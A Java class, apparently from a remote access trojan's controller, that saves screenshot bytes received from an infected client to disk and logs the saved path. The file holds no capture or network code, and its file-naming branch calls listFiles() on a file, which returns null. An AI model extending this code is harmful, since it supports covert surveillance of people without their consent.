package net.jrat.core.packet.client;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;

import net.jrat.core.packet.IPacket;
import net.jrat.utils.Logger;
import net.jrat.utils.Variables;

public class C4PacketScreenshot implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private byte[] filedata;
	private String outputpath;
	
	@Override
	public void execute(Object object) throws Exception
	{
		File file = new File(this.outputpath);
		
		if(!(file.exists()))
		{
			file.getParentFile().mkdirs();
			file.createNewFile();
		}
		else
		{
			file = new File(this.outputpath + "#" + file.listFiles().length);
			
			if(!(file.exists()))
			{
				file.getParentFile().mkdirs();
				file.createNewFile();
			}
		}
		
		final BufferedOutputStream writer = new BufferedOutputStream(new FileOutputStream(file));
		writer.write(this.filedata);
		writer.close();
		
		Logger.space();
		Logger.log("screenshot saved: " + file.getAbsolutePath());
		Logger.space();
		
		System.out.print(Variables.instance.appname + " -> ");
	}
}